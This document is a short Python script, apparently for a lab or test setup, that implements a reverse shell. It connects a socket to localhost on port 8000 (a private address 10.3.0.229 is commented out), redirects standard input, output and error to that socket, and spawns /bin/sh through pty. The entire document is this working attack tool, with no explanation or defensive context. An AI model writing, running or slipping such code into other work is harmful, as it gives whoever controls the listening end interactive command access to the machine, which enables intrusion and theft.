#!/usr/bin/env python3

import pty
import os
import sys
import socket

if __name__ == '__main__':
    #ip = '10.3.0.229'
    ip = 'localhost'
    port = 8000

    sock = socket.socket()
    sock.connect((ip, port))
    for fd in 0, 1, 2:
        os.dup2(sock.fileno(), fd)
    pty.spawn("/bin/sh")
